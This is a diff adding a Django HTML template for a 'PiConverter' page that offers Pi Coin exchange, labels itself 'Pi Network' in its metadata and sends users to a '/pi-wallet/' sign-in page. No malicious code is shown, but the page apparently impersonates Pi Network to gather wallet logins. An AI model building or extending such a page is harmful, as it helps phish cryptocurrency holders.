@@ -1,0 +1,177 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Pi Converter, Blockchain, A Fast And Reliable Way to Exchange Your Pi Coin, Whit Trust And Garantee.." /> 
+    <link rel="canonical" href="https://{{request.path_info}}" />               
+    <meta property="og:site_name" content="PiConverter" />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="Pi Converter, Blockchain, Community & Developer Platform | Pi Network" />
+<meta property="og:description" content="Pi Converter, Blockchain, A Fast And Reliable Way to Exchange Your Pi Coin, Whit Trust And Garantee." />
+<meta property="og:image" content="https://PiConverter.info{% static '' %}" />
+<meta property="og:locale" content="en_us" />
+<meta property="og:url" content="https://PiConverter.info{{request.path_info}}" />
+<meta name="twitter:site" content="@PiConverter" />
+<meta name="twitter:title" content="" />
+<meta name="twitter:description" content="Pi Converter, Blockchain, A Fast And Reliable Way to Exchange Your Pi Coin, Whit Trust And Garantee.." />
+<meta name="twitter:creator" content="@PiNetwork" />
+<meta name="twitter:image" content="https://{% static '' %}" />
+<meta property="twiter:card" content="summary_large_image" />
+<meta name="twitter:image:alt" content="PiConverter Logo" />
+      <link rel="stylesheet" href="{% static 'piconverterapp/styles/docs.css' %}">
+      <link rel="apple-touch-icon" sizes="180x180" href="{% static 'piconverterapp/favicon.io/apple-touch-icon.png' %}">
+      <link rel="icon" type="image/png" sizes="32x32" href="{% static 'piconverterapp/favicon.io/favicon-32x32.png' %}">
+      <link rel="icon" type="image/png" sizes="16x16" href="{% static 'piconverterapp/favicon.io/favicon-16x16.png' %}">
+      <link rel="manifest" href="{% static 'piconverterapp/favicon.io/site.webmanifest' %}">  
+
+    <title>Develop pinet</title>
+</head>
+
+<style>
+.type{
+    padding: 100px 30px;
+    box-sizing: border-box;
+    overflow: hidden;
+    color: #000;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+    height: 100vh;
+    font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell,
+     'Open Sans', 'Helvetica Neue', sans-serif;
+     text-align: center;
+}
+.tick{
+    letter-spacing: 1px;
+    line-height: 25px;
+    color: #141414;
+    font-weight: 500;
+    font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    font-size: 15px;
+
+}
+.btns{
+    width: 90%;
+    box-sizing: border-box;
+    overflow: hidden;
+    gap: 10px;
+}
+.btns button{
+    width: 100%;
+    box-sizing: border-box;
+    overflow: hidden;
+    height: 40px;
+    border: none;
+    border-radius: 7px;
+    margin-top: 10px;
+}
+.tick_button{
+    width: 300px;
+    height: 40px;
+    color: #fff;
+    background-color: rebeccapurple;
+    overflow: hidden;
+    border: none;
+    border-radius: 20px;
+}
+.btns button{
+    background-color: #a96ae7e7;
+    color: #fff;
+}
+.ticks{
+    width: 100%;
+    text-align: none;
+    color: rebeccapurple !important;
+    display: flex;
+    align-items: center;
+    text-decoration: none;
+}
+.ticks button{
+    border: 1px solid #a96ae7 !important;
+    color: rebeccapurple;
+    background-color: transparent !important;
+}
+.btns p{
+    text-align: center;
+    width: 100%;
+    color: rgb(228, 17, 17);
+    font-size: 15px;
+    letter-spacing: 1px;
+}
+.iig{
+    width: 30px !important;
+    height: 30px !important;
+}
+
+
+@media screen and (max-width:1000px) {
+    .btns{
+        position: absolute;
+        top: 80%;
+    }
+}
+@media screen and (max-width:700px) {
+    .type{
+        padding: 50px 20px;
+    }
+}
+@media screen and (max-width:550px) {
+    .btns p{
+        font-size: 12px !important;
+    }
+    .type h2{
+        font-size: 1.2rem;
+    }
+}
+@media screen and (max-width:400px) {
+    .type h2{
+        font-size: 1rem !important;
+    }
+    .tick{
+        line-height: 25px !important;
+    }
+}
+</style>
+
+<body>
+    <header class="wallet-head">
+        <nav class="wallet-nav">
+            <a href="">
+                <button class="row">
+                    &leftarrow;
+                </button>
+            </a>
+            <aside style="display:flex; align-items:center;justify-content:center;">
+                <img class="iig" src="{% static 'piconverterapp/favicon.io/favicon.ico' %}" alt="">  Mine
+            </aside>
+        </nav>
+    </header>
+
+    <aside class="check type">
+
+        <h2>
+         To sign-in Marketplace whit your Pi account
+        </h2>
+        <ol class="tick">
+            <li>
+                Open the Pi Network mobile app
+            </li>
+            <li>
+                In the side menu, tap "Pi Browser"
+            </li>
+        </ol>
+
+        <button class="tick_button" onclick="window.location.replace('/pi-wallet/')">
+            Use other sign-in methods
+        </button>
+
+    </aside>
+
+    
+</body>
+</html>
